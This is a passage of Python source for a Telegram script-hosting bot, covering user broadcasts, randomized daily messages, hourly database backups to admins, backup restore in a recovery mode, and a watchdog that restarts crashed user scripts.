            elif photo_id:
                bot.send_photo(uid, photo_id, caption=caption, parse_mode='HTML')
            elif video_id:
                bot.send_video(uid, video_id, caption=caption, parse_mode='HTML')
            sent += 1
        except telebot.apihelper.ApiTelegramException as e:
            err = str(e).lower()
            if any(s in err for s in ["blocked", "deactivated", "not found", "kicked"]):
                blocked += 1
            elif "flood" in err or "too many" in err:
                m = re.search(r"retry after (\d+)", err)
                time.sleep(int(m.group(1)) + 1 if m else 5)
                try:
                    if text:      bot.send_message(uid, text, parse_mode='HTML')
                    elif photo_id: bot.send_photo(uid, photo_id, caption=caption)
                    sent += 1
                except Exception:
                    failed += 1
            else:
                failed += 1
        except Exception:
            failed += 1
        if (i + 1) % 25 == 0:
            time.sleep(1.5)
        elif i % 5 == 0:
            time.sleep(0.2)
    try:
        bot.send_message(
            admin_chat_id,
            f"📣 <b>Broadcast Complete</b>\n\n"
            f"✅ Sent: <code>{sent}</code>\n"
            f"❌ Failed: <code>{failed}</code>\n"
            f"🚫 Blocked/Inactive: <code>{blocked}</code>\n"
            f"📊 Total reached: <code>{sent}/{len(active_users)}</code>",
            parse_mode='HTML'
        )
    except Exception:
        pass

BUTTON_MAP = {
    "📤 Upload File":  _logic_upload_file,
    "📂 Check Files":  _logic_check_files,
    "📊 Statistics":   _logic_statistics,
    "⚡ Bot Speed":    _logic_bot_speed,
    "🤝 Sister Bots":  _logic_sister_bots,
    "🏠 Main Menu":    _logic_send_welcome,
    "👑 Admin Panel":  _logic_admin_panel,
}

# ── DAILY RANDOM MESSAGE SCHEDULER ────────────────────────────────────────
import random as _random

def _send_daily_messages_worker():
    logger.info("Daily message scheduler started.")
    while True:
        try:
            if not daily_msg_enabled or not active_users:
                time.sleep(300)
                continue

            sends_today = _random.randint(4, 5)
            interval_seconds = 86400 // sends_today
            jitter           = interval_seconds // 4

            for _ in range(sends_today):
                if not daily_msg_enabled:
                    break
                sleep_time = interval_seconds + _random.randint(-jitter, jitter)
                sleep_time = max(3600, sleep_time)
                time.sleep(sleep_time)

                if not daily_msg_enabled or not active_users:
                    continue

                msg_text = _random.choice(DAILY_MESSAGES)
                sent = failed = 0
                for uid in list(active_users):
                    try:
                        bot.send_message(uid, msg_text)
                        sent += 1
                    except telebot.apihelper.ApiTelegramException as e:
                        err = str(e).lower()
                        if "flood" in err or "too many" in err:
                            m = re.search(r"retry after (\d+)", err)
                            time.sleep(int(m.group(1)) + 1 if m else 5)
                        failed += 1
                    except Exception:
                        failed += 1
                    time.sleep(0.1)

                logger.info(f"Daily message sent: {sent} ok, {failed} failed.")
                try:
                    bot.send_message(
                        OWNER_ID,
                        f"💬 <b>Daily Message Sent</b>\n"
                        f"✅ {sent} users  ❌ {failed} failed\n"
                        f"<i>\"{msg_text[:80]}...\"</i>",
                        parse_mode='HTML'
                    )
                except Exception:
                    pass

        except Exception as e:
            logger.error(f"_send_daily_messages_worker: {e}", exc_info=True)
            time.sleep(600)

def _start_daily_scheduler():
    t = threading.Thread(target=_send_daily_messages_worker, daemon=True)
    t.start()
    logger.info("Daily message scheduler thread launched.")

# ── HOURLY AUTO-BACKUP SYSTEM (JSON) ──────────────────────────────────────
import json as _json

BACKUP_INTERVAL_SECONDS = 3600   # every 1 hour
_last_backup_time       = None   # track last successful backup

def _export_db_to_json() -> str | None:
    """Read all tables from SQLite and dump as a single JSON file. Returns file path or None."""
    try:
        ts        = datetime.now().strftime('%Y%m%d_%H%M%S')
        json_path = os.path.join(tempfile.gettempdir(), f"hostbot_backup_{ts}.json")

        conn = _get_conn(DATABASE_PATH)
        conn.row_factory = sqlite3.Row
        c    = conn.cursor()

        tables = ['subscriptions', 'user_files', 'active_users', 'admins',
                  'file_approvals', 'running_scripts']

        data = {
            '_meta': {
                'exported_at': datetime.now().isoformat(),
                'bot_version': 'crashpatchedhost',
                'users':       len(active_users),
                'files':       sum(len(v) for v in user_files.values()),
                'subs':        len(user_subscriptions),
            }
        }

        for tbl in tables:
            try:
                c.execute(f'SELECT * FROM {tbl}')
                rows = c.fetchall()
                data[tbl] = [dict(r) for r in rows]
            except Exception as e:
                logger.warning(f"JSON export: skipping table {tbl}: {e}")
                data[tbl] = []

        conn.close()

        with open(json_path, 'w', encoding='utf-8') as f:
            _json.dump(data, f, ensure_ascii=False, indent=2, default=str)

        return json_path
    except Exception as e:
        logger.error(f"_export_db_to_json: {e}", exc_info=True)
        return None

def _export_db_to_json_gz() -> str | None:
    """Export all DB tables to a gzip-compressed JSON file. Returns path or None."""
    try:
        import gzip, json as _json2
        ts       = datetime.now().strftime('%Y%m%d_%H%M%S')
        gz_path  = os.path.join(tempfile.gettempdir(), f"hostbot_backup_{ts}.json.gz")

        conn = _get_conn(DATABASE_PATH)
        conn.row_factory = sqlite3.Row
        c    = conn.cursor()

        tables = ['subscriptions', 'user_files', 'active_users', 'admins',
                  'file_approvals', 'running_scripts']
        data = {
            '_meta': {
                'exported_at': datetime.now().isoformat(),
                'bot_version': 'hardened-v2',
                'users': len(active_users),
                'files': sum(len(v) for v in user_files.values()),
                'subs':  len(user_subscriptions),
            }
        }
        for tbl in tables:
            try:
                c.execute(f'SELECT * FROM {tbl}')
                data[tbl] = [dict(r) for r in c.fetchall()]
            except Exception as e:
                logger.warning(f"JSON export: skipping {tbl}: {e}")
                data[tbl] = []
        conn.close()

        raw = _json2.dumps(data, ensure_ascii=False, indent=2, default=str).encode('utf-8')
        with gzip.open(gz_path, 'wb', compresslevel=9) as gz:
            gz.write(raw)
        return gz_path
    except Exception as e:
        logger.error(f"_export_db_to_json_gz: {e}", exc_info=True)
        return None

_TELEGRAM_MAX_BYTES = 49 * 1024 * 1024   # 49 MB — stay under Telegram's 50 MB limit

def _send_backup_to_admins(triggered_by: str = "auto"):
    """
    Export DB → gzip JSON → send to owner + admins.
    If the file still exceeds Telegram's 50 MB limit after compression,
    split it into chunks and send each one separately.
    """
    global _last_backup_time
    gz_path = _export_db_to_json_gz()
    if not gz_path:
        logger.error("Backup: failed to create gzip export.")
        return False

    ts_str  = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    caption = (
        f"🗄️ <b>{'⏰ Auto' if triggered_by == 'auto' else '🔧 Manual'} Backup</b>\n\n"
        f"🕐 <code>{ts_str}</code>\n"
        f"👥 Users: <code>{len(active_users)}</code>\n"
        f"📁 Files: <code>{sum(len(v) for v in user_files.values())}</code>\n"
        f"💎 Subs:  <code>{len(user_subscriptions)}</code>\n\n"
        f"<i>Restore via 🔁 Recovery Mode in Admin Panel.</i>"
    )

    file_size = os.path.getsize(gz_path)
    recipients = set(admin_ids) | {OWNER_ID}
    sent_ok = 0

    try:
        if file_size <= _TELEGRAM_MAX_BYTES:
            # ── Normal single-file send ────────────────────────────────────
            base_name = os.path.basename(gz_path)
            for rid in recipients:
                try:
                    with open(gz_path, 'rb') as f:
                        bot.send_document(rid, f, caption=caption,
                                          parse_mode='HTML', visible_file_name=base_name)
                    sent_ok += 1
                except Exception as e:
                    logger.warning(f"Backup send to {rid}: {e}")
        else:
            # ── File too large: split into ≤49 MB binary chunks ───────────
            with open(gz_path, 'rb') as f:
                raw = f.read()

            total_parts = math.ceil(len(raw) / _TELEGRAM_MAX_BYTES)
            logger.info(f"Backup too large ({file_size//1024//1024}MB), splitting into {total_parts} parts.")

            for rid in recipients:
                try:
                    bot.send_message(rid,
                        f"📦 Backup is large ({file_size//1024//1024} MB compressed). "
                        f"Sending in <b>{total_parts} parts</b>…",
                        parse_mode='HTML')
                    for i in range(total_parts):
                        chunk     = raw[i * _TELEGRAM_MAX_BYTES : (i + 1) * _TELEGRAM_MAX_BYTES]
                        part_name = f"backup_part{i+1}of{total_parts}.bin"
                        part_cap  = (f"🗄️ Backup Part {i+1}/{total_parts}\n{ts_str}"
                                     if i == 0 else f"Part {i+1}/{total_parts}")
                        buf = io.BytesIO(chunk)
                        buf.name = part_name
                        bot.send_document(rid, buf, caption=part_cap, visible_file_name=part_name)
                    sent_ok += 1
                except Exception as e:
                    logger.warning(f"Chunked backup to {rid}: {e}")
    finally:
        try:
            os.remove(gz_path)
        except Exception:
            pass

    _last_backup_time = datetime.now()
    logger.info(f"Backup sent to {sent_ok}/{len(recipients)} recipients.")
    return sent_ok > 0

def _hourly_backup_worker():
    logger.info("Hourly backup scheduler started.")
    time.sleep(300)   # wait 5 min after boot before first backup
    while True:
        try:
            if hourly_backup_enabled:
                _send_backup_to_admins(triggered_by="auto")
            else:
                logger.info("Hourly backup skipped (disabled via admin panel).")
        except Exception as e:
            logger.error(f"_hourly_backup_worker: {e}", exc_info=True)
        time.sleep(BACKUP_INTERVAL_SECONDS)

def _start_hourly_backup():
    t = threading.Thread(target=_hourly_backup_worker, daemon=True)
    t.start()
    logger.info("Hourly backup thread launched.")

# ── SELF HEALTH-CHECK — makes sure Flask + bot polling are both alive ──────
_HEALTHCHECK_INTERVAL = 300   # 5 minutes
_last_healthcheck_ok   = True

def _self_healthcheck_worker():
    global _last_healthcheck_ok
    while True:
        time.sleep(_HEALTHCHECK_INTERVAL)
        try:
            port = int(os.environ.get("PORT", 8080))
            r = requests.get(f"http://127.0.0.1:{port}/", timeout=10)
            flask_ok = (r.status_code == 200)
        except Exception as e:
            flask_ok = False
            logger.error(f"Healthcheck: Flask keep-alive unreachable: {e}")

        if not flask_ok and _last_healthcheck_ok:
            # Only alert on the transition to failing, to avoid spamming.
            try:
                bot.send_message(
                    OWNER_ID,
                    "🚨 <b>Health-check failed</b>\n\n"
                    "The Flask keep-alive endpoint didn't respond. "
                    "If the bot also stops responding to Telegram, it may need a manual restart.",
                    parse_mode='HTML'
                )
            except Exception:
                pass
        _last_healthcheck_ok = flask_ok

def _start_self_healthcheck():
    t = threading.Thread(target=_self_healthcheck_worker, daemon=True)
    t.start()
    logger.info("Self health-check thread launched.")

# ── SCHEDULED BROADCASTS — sends queued broadcasts when their time comes ───
_SCHEDULED_BROADCAST_POLL = 30   # seconds

def _scheduled_broadcast_worker():
    while True:
        time.sleep(_SCHEDULED_BROADCAST_POLL)
        try:
            due = get_due_scheduled_broadcasts()
            for bid, text, photo_id, created_by in due:
                sent = 0
                for uid in list(active_users):
                    try:
                        if photo_id:
                            bot.send_photo(uid, photo_id, caption=text or None, parse_mode='HTML')
                        else:
                            bot.send_message(uid, text, parse_mode='HTML')
                        sent += 1
                    except Exception:
                        pass
                mark_broadcast_sent(bid)
                log_audit(created_by, 'scheduled_broadcast_sent', f"id={bid} reached={sent}")
                try:
                    bot.send_message(created_by, f"📣 Scheduled broadcast #{bid} sent to {sent} users.")
                except Exception:
                    pass
        except Exception as e:
            logger.error(f"_scheduled_broadcast_worker: {e}", exc_info=True)

def _start_scheduled_broadcasts():
    t = threading.Thread(target=_scheduled_broadcast_worker, daemon=True)
    t.start()
    logger.info("Scheduled broadcast thread launched.")

# ── RECOVERY MODE — restore DB from a backup .json file ───────────────────
def _enter_recovery_mode(call):
    """Admin clicks 'Recovery Mode' → bot waits for a .json backup file."""
    uid = call.from_user.id
    if uid not in admin_ids:
        bot.answer_callback_query(call.id, "⛔ Admin only.", show_alert=True)
        return
    bot.answer_callback_query(call.id)

    recovery_mode[call.message.chat.id] = True

    mk = types.InlineKeyboardMarkup()
    mk.add(_btn("❌ Cancel Recovery", "danger", "cancel_recovery"))

    bot.send_message(
        call.message.chat.id,
        "🔁 <b>Recovery Mode ACTIVE</b>\n\n"
        "📤 Send me a backup file — any of these formats:\n"
        "  • <code>.json</code>  — hourly auto-backup export\n"
        "  • <code>.db</code>    — raw SQLite database\n"
        "  • <code>.sqlite</code> — raw SQLite database\n"
        "  • <code>.zip</code>   — zip containing any of the above\n\n"
        "⚠️ <b>Warning:</b> Current database will be overwritten!\n"
        "All running scripts will be stopped first.\n\n"
        "🔒 Bot will lock itself during restore.",
        parse_mode='HTML',
        reply_markup=mk
    )

def _restore_from_json(data: dict, json_filename: str, chat_id: int, admin_uid: int):
    """Write JSON data back into SQLite, reload in-memory state, broadcast."""
    global bot_locked
    try:
        # 1. Lock & stop all scripts
        bot_locked = True
        bot.send_message(chat_id, "🔒 <b>Locking bot and stopping all scripts…</b>", parse_mode='HTML')
        with BOT_SCRIPTS_LOCK:
            for key in list(bot_scripts.keys()):
                pi = bot_scripts.get(key)
                if pi:
                    kill_process_tree(pi)
            bot_scripts.clear()
        time.sleep(1)

        # 2. Save a JSON snapshot of current DB before overwrite (safety net)
        pre_snap = _export_db_to_json()
        if pre_snap:
            ts_now  = datetime.now().strftime('%Y%m%d_%H%M%S')
            safe_bk = os.path.join(DATA_DIR, f'pre_restore_{ts_now}.json')
            shutil.move(pre_snap, safe_bk)
            logger.info(f"Pre-restore JSON snapshot saved: {safe_bk}")

        # 3. Write JSON rows back into both SQLite databases
        tables = ['subscriptions', 'user_files', 'active_users', 'admins',
                  'file_approvals', 'running_scripts']

        for db_path in [DATABASE_PATH, BACKUP_DATABASE_PATH]:
            with DB_LOCK:
                conn = _get_conn(db_path)
                c    = conn.cursor()
                for tbl in tables:
                    rows = data.get(tbl, [])
                    if not rows:
                        continue
                    try:
                        cols        = list(rows[0].keys())
                        placeholders = ', '.join('?' * len(cols))
                        col_names    = ', '.join(cols)
                        c.execute(f'DELETE FROM {tbl}')
                        for row in rows:
                            c.execute(
                                f'INSERT OR REPLACE INTO {tbl} ({col_names}) VALUES ({placeholders})',
                                [row.get(col) for col in cols]
                            )
                    except Exception as e:
                        logger.warning(f"Restore table {tbl} into {db_path}: {e}")
                # Always keep owner + admin in admins table
                c.execute('INSERT OR IGNORE INTO admins (user_id) VALUES (?)', (OWNER_ID,))
                if ADMIN_ID != OWNER_ID:
                    c.execute('INSERT OR IGNORE INTO admins (user_id) VALUES (?)', (ADMIN_ID,))
                conn.commit()
                conn.close()

        bot.send_message(chat_id, "✅ <b>Tables restored.</b> Reloading in-memory state…", parse_mode='HTML')

        # 4. Reload in-memory state from the freshly written DB
        user_subscriptions.clear()
        user_files.clear()
        active_users.clear()
        admin_ids.clear()
        admin_ids.add(OWNER_ID)
        admin_ids.add(ADMIN_ID)
        load_data()

        # 5. Unlock
        bot_locked = False

        # 6. Success report to admin
        meta = data.get('_meta', {})
        bot.send_message(
            chat_id,
            f"🎉 <b>Database Recovered from JSON!</b>\n\n"
            f"📄 File: <code>{_esc(json_filename)}</code>\n"
            f"🗓️ Backup taken: <code>{meta.get('exported_at', '?')}</code>\n"
            f"⏱️ Restored at: <code>{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</code>\n\n"
            f"👥 Users loaded: <code>{len(active_users)}</code>\n"
            f"📁 Files loaded: <code>{sum(len(v) for v in user_files.values())}</code>\n"
            f"💎 Subs loaded:  <code>{len(user_subscriptions)}</code>\n\n"
            f"🔓 Bot is <b>unlocked</b> and running normally.",
            parse_mode='HTML',
            reply_markup=create_admin_panel_markup()
        )
        logger.info(f"JSON recovery done by admin {admin_uid}, file: {json_filename}")

        # 7. Broadcast to all users
        recovery_msg = (
            "✅ <b>Bot Database Recovered!</b>\n\n"
            "🔄 Our database was restored from a backup.\n"
            "🚀 <b>Everything is working normally — start using the bot now!</b>\n\n"
            "💡 If your files are missing, please re-upload them.\n"
            "📞 Contact admin if you need help."
        )
        broadcast_count = 0
        for uid in list(active_users):
            try:
                bot.send_message(uid, recovery_msg, parse_mode='HTML')
                broadcast_count += 1
                time.sleep(0.07)
            except Exception:
                pass

        try:
            bot.send_message(
                chat_id,
                f"📣 <b>Recovery Broadcast Complete</b>\n"
                f"✅ Notified <code>{broadcast_count}</code> users.",
                parse_mode='HTML'
            )
        except Exception:
            pass

    except Exception as e:
        bot_locked = False
        logger.error(f"_restore_from_json: {e}", exc_info=True)
        try:
            bot.send_message(
                chat_id,
                f"❌ <b>Recovery failed!</b>\n\n<code>{_esc(str(e))}</code>",
                parse_mode='HTML'
            )
        except Exception:
            pass

def _restore_from_sqlite_bytes(db_bytes: bytes, db_filename: str, chat_id: int, admin_uid: int):
    """Restore by directly replacing the SQLite file, then reload in-memory state."""
    global bot_locked
    try:
        bot_locked = True
        bot.send_message(chat_id, "🔒 <b>Locking bot and stopping all scripts…</b>", parse_mode='HTML')
        with BOT_SCRIPTS_LOCK:
            for key in list(bot_scripts.keys()):
                pi = bot_scripts.get(key)
                if pi:
                    kill_process_tree(pi)
            bot_scripts.clear()
        time.sleep(1)

        # Safety snapshot of current DB as JSON before overwriting
        pre_snap = _export_db_to_json()
        if pre_snap:
            ts_now  = datetime.now().strftime('%Y%m%d_%H%M%S')
            safe_bk = os.path.join(DATA_DIR, f'pre_restore_{ts_now}.json')
            shutil.move(pre_snap, safe_bk)
            logger.info(f"Pre-restore snapshot saved: {safe_bk}")

        for db_path in [DATABASE_PATH, BACKUP_DATABASE_PATH]:
            with open(db_path, 'wb') as f:
                f.write(db_bytes)

        bot.send_message(chat_id, "✅ <b>SQLite file written.</b> Reloading data…", parse_mode='HTML')

        user_subscriptions.clear()
        user_files.clear()
        active_users.clear()
        admin_ids.clear()
        admin_ids.add(OWNER_ID)
        admin_ids.add(ADMIN_ID)
        load_data()

        bot_locked = False

        bot.send_message(
            chat_id,
            f"🎉 <b>Database Recovered from SQLite!</b>\n\n"
            f"📄 File: <code>{_esc(db_filename)}</code>\n"
            f"⏱️ Restored at: <code>{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</code>\n\n"
            f"👥 Users: <code>{len(active_users)}</code>\n"
            f"📁 Files: <code>{sum(len(v) for v in user_files.values())}</code>\n"
            f"💎 Subs: <code>{len(user_subscriptions)}</code>\n\n"
            f"🔓 Bot is <b>unlocked</b> and running normally.",
            parse_mode='HTML',
            reply_markup=create_admin_panel_markup()
        )
        logger.info(f"SQLite recovery done by admin {admin_uid}, file: {db_filename}")

        recovery_msg = (
            "✅ <b>Bot Database Recovered!</b>\n\n"
            "🔄 Our database was restored from a backup.\n"
            "🚀 <b>Everything is working normally — start using the bot now!</b>\n\n"
            "💡 If your files are missing, please re-upload them.\n"
            "📞 Contact admin if you need help."
        )
        broadcast_count = 0
        for uid in list(active_users):
            try:
                bot.send_message(uid, recovery_msg, parse_mode='HTML')
                broadcast_count += 1
                time.sleep(0.07)
            except Exception:
                pass

        try:
            bot.send_message(
                chat_id,
                f"📣 <b>Recovery Broadcast Complete</b>\n"
                f"✅ Notified <code>{broadcast_count}</code> users.",
                parse_mode='HTML'
            )
        except Exception:
            pass

    except Exception as e:
        bot_locked = False
        logger.error(f"_restore_from_sqlite_bytes: {e}", exc_info=True)
        try:
            bot.send_message(
                chat_id,
                f"❌ <b>Recovery failed!</b>\n\n<code>{_esc(str(e))}</code>",
                parse_mode='HTML'
            )
        except Exception:
            pass

@bot.message_handler(
    func=lambda m: recovery_mode.get(m.chat.id),
    content_types=['document']
)
def handle_recovery_document(message):
    """Intercept documents when recovery mode is active — expects a .json backup."""
    uid     = message.from_user.id
    chat_id = message.chat.id

    if uid not in admin_ids:
        bot.reply_to(message, "⛔ Admin only.")
        return

    doc = message.document
    if not doc:
        bot.reply_to(message, "❌ Please send a file.")
        return

    fname = doc.file_name or ""
    ext   = os.path.splitext(fname)[1].lower()

    ACCEPTED_EXTS = ('.json', '.db', '.sqlite', '.zip')
    if ext not in ACCEPTED_EXTS:
        bot.reply_to(
            message,
            f"❌ Unsupported file type <code>{_esc(ext)}</code>.\n"
            f"Accepted: <code>.json</code> · <code>.db</code> · <code>.sqlite</code> · <code>.zip</code>",
            parse_mode='HTML'
        )
        return

    # Exit recovery mode
    recovery_mode.pop(chat_id, None)

    status_msg = bot.reply_to(message, f"⬇️ Downloading <code>{_esc(fname)}</code>…", parse_mode='HTML')

    try:
        file_info = bot.get_file(doc.file_id)
        raw_bytes = bot.download_file(file_info.file_path)
    except Exception as e:
        bot.edit_message_text(f"❌ Download failed: {_esc(str(e))}", chat_id, status_msg.message_id)
        return

    bot.edit_message_text("🔍 Detecting format & validating…", chat_id, status_msg.message_id)

    # ── Normalise to a JSON dict regardless of input format ──────────────
    data     = None
    db_bytes = None   # used for raw SQLite restore path

    if ext == '.zip':
        # Extract: prefer .json inside, fall back to .db/.sqlite
        try:
            with zipfile.ZipFile(io.BytesIO(raw_bytes)) as zf:
                names = zf.namelist()
                # prefer JSON backup
                json_entry = next((n for n in names if n.endswith('.json')), None)
                db_entry   = next((n for n in names if n.endswith(('.db', '.sqlite'))), None)
                if json_entry:
                    try:
                        data = _json.loads(zf.read(json_entry).decode('utf-8'))
                        fname = json_entry
                    except Exception:
                        pass
                if data is None and db_entry:
                    db_bytes = zf.read(db_entry)
                    fname    = db_entry
                if data is None and db_bytes is None:
                    bot.edit_message_text(
                        "❌ Zip contains no recognisable backup file.\n"
                        "Expected a <code>.json</code>, <code>.db</code>, or <code>.sqlite</code> inside.",
                        chat_id, status_msg.message_id, parse_mode='HTML'
                    )
                    return
        except Exception as e:
            bot.edit_message_text(f"❌ Could not open zip: {_esc(str(e))}", chat_id, status_msg.message_id)
            return

    elif ext == '.json':
        try:
            data = _json.loads(raw_bytes.decode('utf-8'))
        except Exception as e:
            bot.edit_message_text(
                f"❌ <b>Invalid JSON!</b>\n<code>{_esc(str(e))}</code>",
                chat_id, status_msg.message_id, parse_mode='HTML'
            )
            return

    else:   # .db / .sqlite  — raw SQLite file
        db_bytes = raw_bytes

    # ── Route: raw SQLite path ────────────────────────────────────────────
    if db_bytes is not None and data is None:
        if not db_bytes.startswith(b'SQLite format 3'):
            bot.edit_message_text(
                "❌ <b>Not a valid SQLite file!</b>\nMagic bytes check failed.",
                chat_id, status_msg.message_id, parse_mode='HTML'
            )
            return
        bot.edit_message_text(
            f"✅ <b>SQLite file detected.</b>\n"
            f"📄 <code>{_esc(fname)}</code>\n\n"
            f"🔄 Starting restore…",
            chat_id, status_msg.message_id, parse_mode='HTML'
        )
        threading.Thread(
            target=_restore_from_sqlite_bytes,
            args=(db_bytes, fname, chat_id, uid),
            daemon=True
        ).start()
        return

    # ── Route: JSON path ──────────────────────────────────────────────────
    known_tables = {'subscriptions', 'user_files', 'active_users', 'admins'}
    if not any(k in data for k in known_tables):
        bot.edit_message_text(
            "❌ <b>Doesn't look like a valid hostbot JSON backup!</b>\n"
            "Missing expected keys: subscriptions, user_files, active_users, admins.",
            chat_id, status_msg.message_id, parse_mode='HTML'
        )
        return

    meta = data.get('_meta', {})
    bot.edit_message_text(
        f"✅ <b>JSON backup validated.</b>\n\n"
        f"📅 Backup from: <code>{meta.get('exported_at', 'unknown')}</code>\n"
        f"👥 Users: <code>{meta.get('users', '?')}</code>\n"
        f"📁 Files: <code>{meta.get('files', '?')}</code>\n\n"
        f"🔄 Starting restore…",
        chat_id, status_msg.message_id, parse_mode='HTML'
    )
    threading.Thread(
        target=_restore_from_json,
        args=(data, fname, chat_id, uid),
        daemon=True
    ).start()

# ── CRASH WATCHDOG — auto-restarts crashed user scripts ───────────────────
_WATCHDOG_INTERVAL   = 60     # seconds between health checks
_CRASH_RESTART_DELAY = 10     # seconds to wait before restarting a crashed script
_MAX_CRASH_RESTARTS  = 5      # max restarts per script within a session
_crash_counts        = {}     # script_key -> int

_watchdog_stop_event = threading.Event()
_watchdog_stats      = {'started_at': None, 'stopped_at': None, 'restarts_done': 0}

def _watchdog_worker():
    """Background thread: monitors running scripts and restarts ones that died unexpectedly."""
    logger.info("Crash watchdog started.")
    while not _watchdog_stop_event.is_set():
        try:
            # Interruptible sleep: wakes immediately if someone stops the watchdog,
            # instead of finishing out the full 60s interval.
            if _watchdog_stop_event.wait(_WATCHDOG_INTERVAL):
                break
            # Check all scripts that should be running (in DB) but aren't in memory
            rows = get_all_running_scripts()
            for uid, fname, ftype, chat_id in rows:
                if _watchdog_stop_event.is_set():
                    break
                script_key = f"{uid}_{fname}"
                if is_bot_running(uid, fname):
                    _crash_counts.pop(script_key, None)   # reset crash counter on healthy run
                    continue

                # Per-script opt-out: some scripts are meant to run once and exit.
                if is_watchdog_excluded(uid, fname):
                    continue

                # Script is marked running in DB but not alive in memory — it crashed
                crash_count = _crash_counts.get(script_key, 0)
                if crash_count >= _MAX_CRASH_RESTARTS:
                    logger.warning(f"Watchdog: {fname} for {uid} hit max restarts ({_MAX_CRASH_RESTARTS}), giving up.")
                    unmark_script_running(uid, fname)
                    _crash_counts.pop(script_key, None)
                    try:
                        bot.send_message(
                            chat_id,
                            f"💀 <b>Script permanently stopped</b>\n\n"
                            f"📄 <code>{_esc(fname)}</code> crashed {_MAX_CRASH_RESTARTS} times.\n"
                            f"Please check your script for bugs and re-upload.",
                            parse_mode='HTML'
                        )
                    except Exception:
                        pass
                    continue

                folder = get_user_folder(uid)
                path   = os.path.join(folder, fname)
                if not os.path.exists(path):
                    unmark_script_running(uid, fname)
                    _crash_counts.pop(script_key, None)
                    continue

                _crash_counts[script_key] = crash_count + 1
                log_crash(uid, fname, crash_count + 1)
                _watchdog_stats['restarts_done'] += 1
                logger.info(f"Watchdog: restarting {fname} for {uid} (attempt {crash_count+1})")
                try:
                    bot.send_message(
                        chat_id,
                        f"♻️ <b>Script crashed — auto-restarting</b>\n\n"
                        f"📄 <code>{_esc(fname)}</code>\n"
                        f"🔁 Restart #{crash_count+1}/{_MAX_CRASH_RESTARTS}",
                        parse_mode='HTML'
                    )
                except Exception:
                    pass

                if _watchdog_stop_event.wait(_CRASH_RESTART_DELAY):
                    break

                import types as _types
                fake_chat = _types.SimpleNamespace(id=chat_id)
                fake_msg  = _types.SimpleNamespace(chat=fake_chat, message_id=None)
                runner = run_script if ftype == 'py' else run_js_script
                threading.Thread(
                    target=runner,
                    args=(path, uid, folder, fname, fake_msg),
                    daemon=True
                ).start()

        except Exception as e:
            logger.error(f"_watchdog_worker: {e}", exc_info=True)
            if _watchdog_stop_event.wait(30):
                break

    logger.info("Crash watchdog thread stopped.")

def _start_watchdog():
    global watchdog_running
    if watchdog_running:
        return False
    watchdog_running = True
    _watchdog_stop_event.clear()
    _watchdog_stats['started_at'] = datetime.now()
    _watchdog_stats['stopped_at'] = None
    _watchdog_stats['restarts_done'] = 0
    t = threading.Thread(target=_watchdog_worker, daemon=True)
    t.start()
    logger.info("Crash watchdog thread launched.")
    return True

def _stop_watchdog():
    global watchdog_running
    if not watchdog_running:
        return False
    _watchdog_stop_event.set()
    watchdog_running = False
    _watchdog_stats['stopped_at'] = datetime.now()
    logger.info("Crash watchdog stop requested.")
    return True



def _ask_owner_start_watchdog():
    """On boot, ask the owner whether to start the crash watchdog (no auto-start)."""
    mk = types.InlineKeyboardMarkup()
    mk.row(
        types.InlineKeyboardButton("✅ Start Watchdog", callback_data="startwd_yes"),
        types.InlineKeyboardButton("❌ Not Now",        callback_data="startwd_no"),
    )
    try:
        bot.send_message(
            OWNER_ID,
            "🐕 <b>Crash Watchdog</b>\n\n"
            "The bot just (re)started. The crash watchdog (auto-restarts scripts that "
            "crash) is <b>OFF</b> by default now.\n\n"
            "Do you want to start it?",
            reply_markup=mk, parse_mode='HTML'
        )
    except Exception as e:
        logger.error(f"_ask_owner_start_watchdog: {e}")

# ── COMMANDS ───────────────────────────────────────────────────────────────

@bot.message_handler(commands=['start', 'help'])
def cmd_start(m): _logic_send_welcome(m)

@bot.message_handler(commands=['ping'])
def cmd_ping(message):
    start = time.time()
    msg   = bot.reply_to(message, "🏓 Pong!")
    rt    = round((time.time() - start) * 1000, 2)
    bot.edit_message_text(
        f"🏓 <b>Pong!</b>\n📡 Latency: <code>{rt} ms</code>\n⏱️ Uptime: <code>{get_uptime()}</code>",
        message.chat.id, msg.message_id, parse_mode='HTML'
    )

@bot.message_handler(commands=['uptime'])
def cmd_uptime(m):
    bot.reply_to(m, f"⏱️ <b>Uptime:</b> <code>{get_uptime()}</code>", parse_mode='HTML')

@bot.message_handler(commands=['watchdog'])
def cmd_watchdog(m):
    if m.from_user.id != OWNER_ID:
        bot.reply_to(m, "Owner only."); return
    arg = (m.text.split(maxsplit=1)[1].strip().lower() if len(m.text.split()) > 1 else '')
    if arg in ('on', 'start'):
        started = _start_watchdog()
        bot.reply_to(m, "✅ Watchdog started." if started else "🐕 Already running.")
    elif arg in ('off', 'stop'):
        stopped = _stop_watchdog()
        bot.reply_to(m, "🛑 Watchdog stopped." if stopped else "🐕 Already off.")
    else:
        state = "ON ✅" if watchdog_running else "OFF ❌"
        bot.reply_to(
            m,
            f"🐕 Watchdog is currently <b>{state}</b>\n\n"
            f"Use <code>/watchdog on</code> or <code>/watchdog off</code> to change it.",
            parse_mode='HTML'
        )

@bot.message_handler(commands=['checkvenv'])
def cmd_checkvenv(m):
    ok, detail = _test_user_venv(m.from_user.id)
    if ok:
        bot.reply_to(m, f"✅ Your venv is <b>working fine</b> (Python {_esc(detail)}).", parse_mode='HTML')
    else:
        bot.reply_to(m, f"⚠️ Your venv looks <b>CRASHED/broken</b>.\nError: <code>{_esc(detail[:300])}</code>\n\n"
                         f"Use the ♻️ Reset My Venv button in 📦 Pip Tools to fix it.", parse_mode='HTML')

@bot.message_handler(commands=['resetvenv'])
def cmd_resetvenv(m):
    uid = m.from_user.id
    msg = bot.reply_to(m, "♻️ Resetting your venv, please wait…")
    ok, result, stopped, snap_count = reset_user_venv(uid)
    if stopped:
        result += f"\n\n🛑 Stopped running script(s): <code>{_esc(', '.join(stopped))}</code>"
    try:
        bot.edit_message_text(result, m.chat.id, msg.message_id, parse_mode='HTML')
    except Exception:
        bot.send_message(m.chat.id, result, parse_mode='HTML')
    if snap_count:
        mk = types.InlineKeyboardMarkup()
        mk.row(_btn("🔁 Reinstall Old Packages", "success", f"reinstallpkgs_{uid}"))
        bot.send_message(m.chat.id, "Want your old packages back?", reply_markup=mk)

@bot.message_handler(commands=['newfolder', 'mkdir_'])
def cmd_newfolder(m):
    uid = m.from_user.id
    parts = (m.text or "").split(maxsplit=1)
    if len(parts) < 2:
